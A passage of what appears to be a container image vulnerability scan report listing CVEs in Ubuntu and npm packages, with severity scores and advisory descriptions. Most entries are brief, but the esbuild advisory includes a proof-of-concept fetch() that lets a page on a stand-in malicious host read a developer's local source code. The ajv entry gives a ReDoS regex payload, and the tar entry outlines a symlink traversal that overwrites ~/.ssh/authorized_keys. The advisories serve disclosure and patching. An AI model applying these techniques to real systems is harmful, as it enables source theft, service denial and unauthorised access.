<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.179%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Heap Buffer Overflow vulnerability in Libde265 v1.0.15 allows attackers to crash the application via crafted payload to __interceptor_memcpy function.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-38949?s=ubuntu&n=libde265&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2024--38949" src="https://img.shields.io/badge/CVE--2024--38949-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.132%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Heap Buffer Overflow vulnerability in Libde265 v1.0.15 allows attackers to crash the application via crafted payload to display444as420 function at sdl.cc

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>jpeg-xl</strong> <code>0.7.0-10.2ubuntu6.1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/jpeg-xl@0.7.0-10.2ubuntu6.1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-0645?s=ubuntu&n=jpeg-xl&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.1: CVE--2023--0645" src="https://img.shields.io/badge/CVE--2023--0645-lightgrey?label=medium%209.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.066%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An out of bounds read exists in libjxl. An attacker using a specifically crafted file could cause an out of bounds read in the exif handler. We recommend upgrading to version 0.8.1 or past commit https://github.com/libjxl/libjxl/pull/2101/commits/d95b050c1822a5b1ede9e0dc937e43fca1b10159 https://github.com/libjxl/libjxl/pull/2101/commits/d95b050c1822a5b1ede9e0dc937e43fca1b10159

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-35790?s=ubuntu&n=jpeg-xl&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2023--35790" src="https://img.shields.io/badge/CVE--2023--35790-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.070%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in dec_patch_dictionary.cc in libjxl before 0.8.2. An integer underflow in patch decoding can lead to a denial of service, such as an infinite loop.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>gnutls28</strong> <code>3.8.3-1.1ubuntu3.4</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/gnutls28@3.8.3-1.1ubuntu3.4?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-14831?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C3.8.3-1.1ubuntu3.5"><img alt="medium : CVE--2025--14831" src="https://img.shields.io/badge/CVE--2025--14831-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.8.3-1.1ubuntu3.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.8.3-1.1ubuntu3.5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.037%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS. This vulnerability allows a denial of service (DoS) by excessive CPU (Central Processing Unit) and memory consumption via specially crafted malicious certificates containing a large number of name constraints and subject alternative names (SANs).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9820?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C3.8.3-1.1ubuntu3.5"><img alt="low : CVE--2025--9820" src="https://img.shields.io/badge/CVE--2025--9820-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.8.3-1.1ubuntu3.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.8.3-1.1ubuntu3.5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the GnuTLS library, specifically in the gnutls_pkcs11_token_init() function that handles PKCS#11 token initialization. When a token label longer than expected is processed, the function writes past the end of a fixed-size stack buffer. This programming error can cause the application using GnuTLS to crash or, in certain conditions, be exploited for code execution. As a result, systems or applications relying on GnuTLS may be vulnerable to a denial of service or local privilege escalation attacks.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>gnupg2</strong> <code>2.4.4-2ubuntu17.4</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/gnupg2@2.4.4-2ubuntu17.4?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68972?s=ubuntu&n=gnupg2&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 4.7: CVE--2025--68972" src="https://img.shields.io/badge/CVE--2025--68972-lightgrey?label=medium%204.7&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>4.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.003%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GnuPG through 2.4.8, if a signed message has \f at the end of a plaintext line, an adversary can construct a modified message that places additional text after the signed material, such that signature verification of the modified message succeeds (although an "invalid armor" message is printed during verification). This is related to use of \f as a marker to denote truncation of a long plaintext line.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-3219?s=ubuntu&n=gnupg2&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 3.3: CVE--2022--3219" src="https://img.shields.io/badge/CVE--2022--3219-lightgrey?label=low%203.3&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>3.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>ajv</strong> <code>8.13.0</code> (npm)</summary>

<small><code>pkg:npm/ajv@8.13.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-69873?s=github&n=ajv&t=npm&vr=%3E%3D7.0.0-alpha.0%2C%3C8.18.0"><img alt="medium 5.5: CVE--2025--69873" src="https://img.shields.io/badge/CVE--2025--69873-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=7.0.0-alpha.0<br/><8.18.0</code></td></tr>
<tr><td>Fixed version</td><td><code>8.18.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\"^(a|a)*$\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pam</strong> <code>1.5.3-5ubuntu5.5</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/pam@1.5.3-5ubuntu5.5?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-8941?s=ubuntu&n=pam&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--8941" src="https://img.shields.io/badge/CVE--2025--8941-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in linux-pam. The pam_namespace module may improperly handle user-controlled paths, allowing local users to exploit symlink attacks and race conditions to elevate their privileges to root. This CVE provides a "complete" fix for CVE-2025-6020.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar</strong> <code>1.35+dfsg-3build1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/tar@1.35%2Bdfsg-3build1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-45582?s=ubuntu&n=tar&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--45582" src="https://img.shields.io/badge/CVE--2025--45582-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.054%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Tar through 1.35 allows file overwrite via directory traversal in crafted TAR archives, with a certain two-step process. First, the victim must extract an archive that contains a ../ symlink to a critical directory. Second, the victim must extract an archive that contains a critical file, specified via a relative pathname that begins with the symlink name and ends with that critical file's name. Here, the extraction follows the symlink and overwrites the critical file. This bypasses the protection mechanism of "Member name contains '..'" that would occur for a single TAR archive that attempted to specify the critical file via a ../ approach. For example, the first archive can contain "x -> ../../../../../home/victim/.ssh" and the second archive can contain x/authorized_keys. This can affect server applications that automatically extract any number of user-supplied TAR archives, and were relying on the blocking of traversal. This can also affect software installation processes in which "tar xf" is run more than once (e.g., when installing a package can automatically install two dependencies that are set up as untrusted tarballs instead of official packages). NOTE: the official GNU Tar manual has an otherwise-empty directory for each "tar xf" in its Security Rules of Thumb; however, third-party advice leads users to run "tar xf" more than once into the same directory.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>expat</strong> <code>2.6.1-2ubuntu0.4</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/expat@2.6.1-2ubuntu0.4?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-66382?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.5: CVE--2025--66382" src="https://img.shields.io/badge/CVE--2025--66382-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In libexpat through 2.7.3, a crafted file with an approximate size of 2 MiB can lead to dozens of seconds of processing time.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>esbuild</strong> <code>0.21.5</code> (npm)</summary>

<small><code>pkg:npm/esbuild@0.21.5</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-67mh-4wv8-2f99?s=github&n=esbuild&t=npm&vr=%3C%3D0.24.2"><img alt="medium 5.3: GHSA--67mh--4wv8--2f99" src="https://img.shields.io/badge/GHSA--67mh--4wv8--2f99-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Origin Validation Error</i>

<table>
<tr><td>Affected range</td><td><code><=0.24.2</code></td></tr>
<tr><td>Fixed version</td><td><code>0.25.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.

### Details

esbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.

https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121
https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363

**Attack scenario**:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
1. The user accesses the malicious web page.
1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.
1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.

In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by

- Fetching `/index.html`: normally you have a script tag here
- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files
- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)
- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file

The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.

### PoC

1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)
2. Extract it and move to that directory
1. Run `npm i`
1. Run `npm run watch`
1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.

![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)

### Impact

Users using the serve feature may get the source code stolen by malicious websites.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>markdown-it</strong> <code>13.0.2</code> (npm)</summary>

<small><code>pkg:npm/markdown-it@13.0.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-2327?s=github&n=markdown-it&t=npm&vr=%3E%3D13.0.0%2C%3C14.1.1"><img alt="medium 5.5: CVE--2026--2327" src="https://img.shields.io/badge/CVE--2026--2327-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=13.0.0<br/><14.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>14.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Versions of the package markdown-it from 13.0.0 and before 14.1.1 are vulnerable to Regular Expression Denial of Service (ReDoS) due to the use of the regex /\*+$/ in the linkify function. An attacker can supply a long sequence of * characters followed by a non-matching character, which triggers excessive backtracking and may lead to a denial-of-service condition.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pixman</strong> <code>0.42.2-1build1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/pixman@0.42.2-1build1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-37769?s=ubuntu&n=pixman&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 6.5: CVE--2023--37769" src="https://img.shields.io/badge/CVE--2023--37769-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

stress-test master commit e4c878 was discovered to contain a FPE vulnerability via the component combine_inner at /pixman-combine-float.c.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>cairo</strong> <code>1.18.0-3build1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/cairo@1.18.0-3build1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-6461?s=ubuntu&n=cairo&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2019--6461" src="https://img.shields.io/badge/CVE--2019--6461-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.053%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in cairo 1.16.0. There is an assertion problem in the function _cairo_arc_in_direction in the file cairo-arc.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-18064?s=ubuntu&n=cairo&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2018--18064" src="https://img.shields.io/badge/CVE--2018--18064-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.510%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

cairo through 1.15.14 has an out-of-bounds stack-memory write during processing of a crafted document by WebKitGTK+ because of the interaction between cairo-rectangular-scan-converter.c (the generate and render_rows functions) and cairo-image-compositor.c (the _cairo_image_spans_and_zero function).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-7475?s=ubuntu&n=cairo&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 5.5: CVE--2017--7475" src="https://img.shields.io/badge/CVE--2017--7475-lightgrey?label=low%205.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.282%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Cairo version 1.15.4 is vulnerable to a NULL pointer dereference related to the FT_Load_Glyph and FT_Render_Glyph resulting in an application crash.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>poppler</strong> <code>24.02.0-1ubuntu9.8</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/poppler@24.02.0-1ubuntu9.8?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-9545?s=ubuntu&n=poppler&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 8.8: CVE--2019--9545" src="https://img.shields.io/badge/CVE--2019--9545-lightgrey?label=low%208.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.333%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Poppler 0.74.0. A recursive function call, in JBIG2Stream::readTextRegion() located in JBIG2Stream.cc, can be triggered by sending a crafted pdf file to (for example) the pdfimages binary. It allows an attacker to cause Denial of Service (Segmentation fault) or possibly have unspecified other impact. This is related to JBIG2Bitmap::clearToZero.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-9543?s=ubuntu&n=poppler&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 8.8: CVE--2019--9543" src="https://img.shields.io/badge/CVE--2019--9543-lightgrey?label=low%208.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.640%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Poppler 0.74.0. A recursive function call, in JBIG2Stream::readGenericBitmap() located in JBIG2Stream.cc, can be triggered by sending a crafted pdf file to (for example) the pdfseparate binary. It allows an attacker to cause Denial of Service (Segmentation fault) or possibly have unspecified other impact. This is related to JArithmeticDecoder::decodeBit.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>harfbuzz</strong> <code>8.3.0-2build2</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/harfbuzz@8.3.0-2build2?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-22693?s=ubuntu&n=harfbuzz&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low : CVE--2026--22693" src="https://img.shields.io/badge/CVE--2026--22693-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
